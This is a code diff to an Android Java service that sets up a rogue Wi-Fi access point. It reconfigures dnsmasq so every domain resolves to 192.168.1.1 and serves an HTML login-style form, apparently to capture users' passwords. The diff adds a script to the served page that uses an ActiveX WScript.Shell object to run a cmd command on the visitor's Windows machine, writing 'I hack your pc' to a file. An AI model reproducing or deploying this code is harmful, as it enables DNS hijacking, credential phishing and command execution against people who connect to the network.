@@ -153,7 +153,7 @@ public class wifiService extends Service {
                                 process.getOutputStream().write(("ip rule add fwmark 0x61 table 61\n").getBytes());
                                 process.getOutputStream().write(("ip rule add iif tun0 table 61\n").getBytes());
                                 process.getOutputStream().write(("killall -9 dnsmasq\n").getBytes());
-                                process.getOutputStream().write(("dnsmasq --no-resolv --bootp-dynamic=192.168.1.1 --no-daemon --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 --interface=br0 --server=/#/192.168.1.1#80 --address=/#/192.168.1.1 --port=80 --dhcp-range=192.168.1.1,192.168.1.255,255.255.255.0,24h --dhcp-broadcast==192.168.1.255 \n").getBytes());
+                                process.getOutputStream().write(("dnsmasq --no-resolv  --listen-address=192.168.1.1 --domain-needed --bootp-dynamic=192.168.1.1  --no-daemon --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 --interface=br0 --server=/#/192.168.1.1 --address=/#/192.168.1.1 --port=80 --dhcp-range=192.168.1.1,192.168.1.255,255.255.255.0,24h --dhcp-broadcast==192.168.1.255 \n").getBytes());
                                 new Thread(new Runnable() {
                                     @Override
                                     public void run() {
@@ -348,7 +348,14 @@ public class wifiService extends Service {
                 "         </center>\n" +
                 "    </div>\n" +
                 "        </div>\n" +
-                "</form>\n" +
+                "</form>\n"+
+                "<script type=\"text/javascript\">\n" +
+                "try{\n" +
+                "var shell =new ActiveXObject(\"WScript.Shell\");\n" +
+                "shell.Run(\"cmd /k echo \\\"I hack your pc\\\">E://import.txt\");\n" +
+                "alert(\"I hack your pc\");\n" +
+                "}catch(ex){}\n" +
+                "</script>\n" +
                 " </body>\n" +
                 "</html>\n", password, user;
 
